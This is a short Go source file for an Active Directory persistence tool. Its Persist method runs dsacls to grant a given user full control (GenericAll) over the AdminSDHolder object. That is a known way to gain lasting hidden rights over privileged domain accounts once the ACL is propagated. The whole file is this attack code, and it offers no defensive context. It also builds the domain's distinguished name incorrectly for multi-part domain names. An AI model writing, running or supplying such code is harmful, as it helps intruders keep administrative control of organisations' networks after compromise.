package ad_persistence

import (
"os/exec"
)

type AdminSDHolderPersist struct {
Domain string
}

func NewAdminSDHolderPersist(domain string) *AdminSDHolderPersist {
return &AdminSDHolderPersist{
Domain: domain,
}
}

func (a *AdminSDHolderPersist) Persist(username string) error {
cmd := exec.Command("dsacls", "CN=AdminSDHolder,CN=System,DC="+a.Domain, "/G", username+":GA")
output, err := cmd.Output()
if err != nil {
return err
}
print(string(output))
return nil
}
